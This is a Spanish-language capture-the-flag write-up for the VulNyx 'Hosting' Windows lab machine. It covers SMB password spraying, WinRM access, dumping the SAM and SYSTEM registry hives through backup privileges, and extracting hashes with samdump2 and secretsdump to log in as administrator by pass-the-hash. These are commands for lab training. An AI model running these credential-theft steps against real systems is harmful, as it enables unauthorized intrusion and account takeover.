# WRITEUP - HOSTING - VULNYX

![image](https://github.com/user-attachments/assets/31eec7d3-79fc-4d19-b25b-d9cece00c7ff)
<!--
## Scannning Network
Realizamos un escaneo de la red para determinar la IP a vulnerar:
```shell
sudo netdiscover -r 192.168.1.0/24
```
Una vez determinada la ip, 192.168.1.22, ejecutamos un escaneo de puertos para identificar posibles vectores de ataque.
```shell
nmap -p- --open --min-rate 5000 -n -Pn -sS 192.168.1.22 -oN firstNmap.txt
```

    PORT      STATE SERVICE      REASON
    80/tcp    open  http         syn-ack ttl 128
    135/tcp   open  msrpc        syn-ack ttl 128
    139/tcp   open  netbios-ssn  syn-ack ttl 128
    445/tcp   open  microsoft-ds syn-ack ttl 128
    49667/tcp open  unknown      syn-ack ttl 128


Por máquinas anteriores, vemos que el SMB y netbios están activos, pero no vemos un reconocimiento del puerto de WINRM, por lo que aunque no esté lo incluiremos en el segundo nmap (5985 (HTTP), 5986 (HTTPS))

nmap -p  80,135,139,445,49667,5985,5986 -sVC 192.168.1.22 -oN secondNmap.txt

    PORT      STATE  SERVICE       VERSION
    80/tcp    open   http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: IIS Windows
    135/tcp   open   msrpc         Microsoft Windows RPC
    139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open   microsoft-ds?
    5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp  closed wsmans
    49667/tcp open   msrpc         Microsoft Windows RPC
    MAC Address: 08:00:27:A7:D9:FE (Oracle VirtualBox virtual NIC)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time: 
    |   date: 2024-12-31T10:07:53
    |_  start_date: N/A
    |_clock-skew: -1h00m02s
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    |_nbstat: NetBIOS name: HOSTING, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a7:d9:fe (Oracle VirtualBox virtual NIC)

Hay winrm! Como sospechabamos. Supongo que esta inexactitud del escaneo se debe a la velocidad a la que lo realizamos, ya que posiblemente tener un rate como mínimo de 5000 paquetes por segundo, haga que el escaneo no sea del todo fiable.
## Enumeration
Revisamos el escaneo con Nmap e identificamos un servicio web abierto por el puerto 80. Vamos a investigar la página principal mientras se realiza un gobuster sobre el servicio web. 

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/speed_webPage.png>

A través de gobuster encontramos una página speed (GOBUSTER no es recursivo)

```shell
gobuster dir -u http://192.168.1.22 -w /usr/share/dirbuster/wordlists/big.txt -t 50
```

Usamos dirb para la recursión completa y nos encuentra más posibles páginas con la wordlist big.txt, pero nada interesante, solo páginas con acceso restringido.

Revisando la página nos encontramos con unos posibles usuarios, además de un tal John Bond, por lo que añadimos todos a un archivo de posibles usuarios.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/posibles_users.png>

Podemos construirnos una pequeña lista de posibles usuarios. Revisando la web, nos encontramos con el comentario de un usuario diferente (John Bond) en el que aparece con el siguiente formato: j.bond. Con esto podemos intuir que los demás usuarios seguirán la misma nomenclatura, de todas formas para quitarnos de dudas, podemos añadir diferentes formatos de los nombres para no perdernos nada.
## Exploitation
Realizamos un ataque de diccionario sobre SMB con cada usuario y nos encontramos con las credenciales de p.smith.

    SMB         192.168.1.22   445    HOSTING          [*] Windows 10.0 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:False)
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:123456 STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:12345 STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:123456789 STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:password STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:iloveyou STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:courtney STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [-] HOSTING\p.smith:booboo STATUS_LOGON_FAILURE 
    SMB         192.168.1.22   445    HOSTING          [+] HOSTING\p.smith:kissme

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/loginSMB_psmith.png>

Miramos los shares con p.smith:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/shares_psmith.png>

No hay nada dentro de IPC$.

Podemos intentar entrar con winrm pero no tendrá exito:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/psmith_winrmERROR.png>

Una vez obtenemos la password de p.smith, podemos intentar enumerar shares, usuarios y demás con estas credenciales:
```shell
enm4linux -a -u p.smith -p kissme 192.168.1.22
```
A partir de esta enumeración, si nos fijamos bien, identificamos una posible contraseña del usuario m.davis a través de su descripción. 

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/pass_mdavis.png>

Probamos con dicho usuario pero no parece ser su contraseña. No es la password de m.davis pero podría ser la pass de cualquiera de los otros usuarios, por lo que realizamos un nuevo ataque sobre todos los usuarios con esta contraseña.

La contraseña pertenece a j.wilson.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/jwilson_pass.png>
<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/shares_jwilson.png>

Por la salida de la enumeración de SMB, vemos que p.smith no tiene permisos de acceso remoto pero, j.wilson sí los tiene:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/jwilson_posibleWinrm.png>

Por lo que vamos a intentar realizar un evil-winrm sobre el usuario con las credenciales adquiridas.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/winrm_jwilson.png>

Tenemos acceso como j.wilson, por lo que recogemos su flag:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/jwilson_userFlag.png>

## Privilege Escalation

Ni history de powershell, ni txt en el servicio web con passwords, ni txt en el sistema con posibles paswords. Hemos visto anteriormente que j.wilson tenía permisos de backup gracias a la enumeración por SMB. Vamos a ver qué permisos son:
```shell
whoami /priv
```
<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/priv_jwilson.png>

Podemos hacer copias de seguridad de archivos y directorios, por lo que podemos extraer contenido de la máquina. En este caso, lo interesante para poder pasar al usuario administrador, sería conseguir los archivos SAM (Security Account Manager) el cuál es una base de datos que almacena información de las cuentas de usuario locales, incluidos sus nombres y contraseñas (estas últimas de forma cifrada o con hashes).

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/securitySAM.png>

Para el proposito de conseguir root.txt (flag de root) nos serviría con dumpear c:/Users/administrator/desktop/root.txt y ya, pero vamos a intentar conseguir una shell como administrator para vulnerar la máquina completamente.

Guardamos el archivo en un directorio diferente para llevarnoslo, ya que de forma directa no tenemos permiso de lectura sobre él:
```shell
reg save hklm\sam c:/Windows/temp/sam
```
* Cuidado con las barras al especificar el registro, deben ser invertidas

Con el comando download \<archivo> nos descargamos el archivo en el directorio en el que hemos ejecutado evil-winrm.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/download_sam.png>

Es un archivo binario, existen diferentes formas de sacar el hash, vamos a probar una de ellas.

samdump2 necesita sam y system, por lo que volvemos a la consola de windows y sacamos hklm\system

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/system_dump.png>

```shell
sudo samdump2 system.dump sam -o hashes 
```
* El orden importa, system antes de sam

En vez de perder el tiempo intentando crackear los hashes (como yo hice), puedes entrar con evil-winrm directamente con el hash, hay que tener cuidado porque en mi caso, samdump2 y secretsdump me han dado hashes diferentes, parece que en este caso secretsdump ha conseguido realizarlo mejor por la diferencia de hashes entre los diferentes usuarios.

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/diferencia_samDumpvssecretsdumping.png>

```shell
impacket-secretsdump -sam sam -system system.dump LOCAL > hashes2
```
Probamos y con el hash de samdump2 no es correcto, vemos que con el de secretsdump sí conseguimos un acceso como admin:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/admin_login.png>

Una vez dentro, recogemos la flag del administrator:

<img src=https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/Hosting/Content/root_flag.png>


### Info
https://book.hacktricks.xyz/windows-hardening/stealing-credentials#stealing-sam-and-system

